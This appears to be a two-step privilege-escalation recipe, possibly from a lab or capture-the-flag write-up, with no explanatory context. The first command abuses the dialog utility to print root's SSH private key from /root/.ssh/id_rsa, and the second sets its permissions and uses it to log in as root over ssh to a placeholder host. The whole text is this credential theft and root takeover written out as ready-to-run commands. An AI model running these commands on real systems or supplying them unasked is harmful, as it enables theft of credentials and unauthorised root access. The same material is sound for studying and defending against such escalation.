1. Get root private key.

```bash
dialog --textbox /root/.ssh/id_rsa 0 0
```

2. Login as root.

```bash
chmod 600 id_rsa
ssh -i id_rsa root@whatever.this.is
```
